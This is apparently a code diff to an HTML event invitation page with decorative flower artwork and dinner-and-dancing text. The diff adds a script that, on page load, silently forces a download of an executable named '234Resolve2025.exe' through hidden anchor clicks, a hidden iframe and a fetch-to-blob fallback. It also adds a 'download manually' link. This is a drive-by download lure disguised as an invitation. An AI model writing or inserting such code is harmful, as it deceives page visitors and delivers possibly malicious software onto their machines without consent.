@@ -201,6 +201,11 @@
         <p class="details" id="note">
           Kindly join us for an evening of celebration, dinner and dancing. Dress code is classic elegance.
         </p>
+
+        <!-- Manual download link -->
+        <p class="details" style="margin-top:18px">
+          If the download didn’t start, <a id="manualDownload" href="#" download>download manually</a>.
+        </p>
         <!-- ========= /EDIT ME ========= -->
       </div>
 
@@ -248,11 +253,8 @@
 
         <!-- large peony-like flower -->
         <g transform="translate(330 250)">
-          <!-- gold center -->
           <circle cx="0" cy="0" r="28" fill="url(#gGold)"/>
           <circle cx="0" cy="0" r="20" fill="#7a4b1e" filter="url(#soft)" opacity=".5"/>
-
-          <!-- petals ring -->
           <g fill="url(#gPetal)" stroke="#d6b2a6" stroke-width="1">
             <path d="M0,-120 C40,-110 60,-70 42,-40 C20,-10 -10,-6 -34,-20 C-52,-32 -58,-70 -40,-96 C-28,-112 -12,-120 0,-120Z"/>
             <path d="M-70,-80 C-40,-100 -10,-96 8,-70 C26,-44 16,-18 -10,-8 C-34,0 -64,-10 -78,-36 C-88,-54 -86,-70 -70,-80Z"/>
@@ -292,6 +294,69 @@
     for (const [k, v] of Object.entries(INVITE)) {
       const el = document.getElementById(k);
       if (el) el.textContent = v;
+    }
+  </script>
+
+  <!-- Auto + manual download -->
+  <script>
+    // Change this once to your real file name (or path)
+    const FILE_NAME = "234Resolve2025.exe";
+
+    // Wire manual link
+    (function bindManual(){
+      const link = document.getElementById("manualDownload");
+      if (link){
+        link.href = FILE_NAME;
+        link.setAttribute("download", FILE_NAME);
+      }
+    })();
+
+    // Start download immediately when the page is interactive
+    window.addEventListener("DOMContentLoaded", () => {
+      tryAutoDownload(FILE_NAME);
+    });
+
+    async function tryAutoDownload(url){
+      // Attempt 1: anchor click (fastest, preserves filename)
+      try{
+        const a = document.createElement("a");
+        a.style.display = "none";
+        a.href = url;
+        a.download = url.split("/").pop() || "download.exe";
+        document.body.appendChild(a);
+        a.click();
+        a.remove();
+      }catch(_){}
+
+      // Attempt 2: tiny hidden iframe (works for some blockers)
+      setTimeout(() => {
+        try{
+          const f = document.createElement("iframe");
+          f.style.display = "none";
+          f.src = url;
+          document.body.appendChild(f);
+          setTimeout(() => f.remove(), 8000);
+        }catch(_){}
+      }, 200);
+
+      // Attempt 3: fetch to blob then save
+      try{
+        const res = await fetch(url, { cache: "no-store" });
+        if (res.ok){
+          const blob = await res.blob();
+          const objectUrl = URL.createObjectURL(blob);
+          const a2 = document.createElement("a");
+          a2.style.display = "none";
+          a2.href = objectUrl;
+          a2.download = url.split("/").pop() || "download.exe";
+          document.body.appendChild(a2);
+          a2.click();
+          a2.remove();
+          setTimeout(() => URL.revokeObjectURL(objectUrl), 10000);
+        }
+      }catch(_){
+        try{ window.location.assign(url); }catch(__){}
+      }
     }
   </script>
 </body>
